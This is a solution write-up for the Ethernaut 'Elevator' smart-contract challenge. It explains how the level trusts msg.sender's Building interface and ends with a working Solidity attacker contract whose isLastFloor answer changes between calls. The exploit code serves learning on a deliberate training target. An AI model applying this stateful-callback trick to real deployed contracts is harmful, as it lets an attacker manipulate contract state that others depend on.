# Level 11: [Elevator](https://ethernaut.openzeppelin.com/level/0x4A151908Da311601D967a6fB9f8cFa5A3E88a251)

## Level objectives:
- Reach the top floor of the contract.

## Analysis
- The Elevator contract contains a function `goTo(uint _floor)` which let's you go to a certain
floor.
- The function is expected to be called from a contract the implements the `Building` interface.
```
Building building = Building(msg.sender);
```
- `Elevator` will only send you to a non-last floor, checked by:
```
if (! building.isLastFloor(_floor)) {...}
```
- Since we control the `Building` contract (the msg.sender), we can implement the `isLastFloor()` so
that we can make it always returns false.

- The second part is to set the variable `top` to true (as that signifies if we have reached the top floor);
- But the variable top is being set only inside the if block. The if-block requires that `isLastFloor()` returns
false.
- But these are not object props that can't change. It's an external function call.
- In our `isLastFloor()` function, we check if the contract's been called before, then we return
true. 
## Code:
```sol
//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {

    uint private called = 0;

    function attack(address _victim) public {
        Elevator victim = Elevator(_victim);
        victim.goTo(10);
    }


    function isLastFloor(uint _floor) external returns (bool) {
        if (called == 0) {
            called++;
            return false;
        }
        return true;
    }
}
```
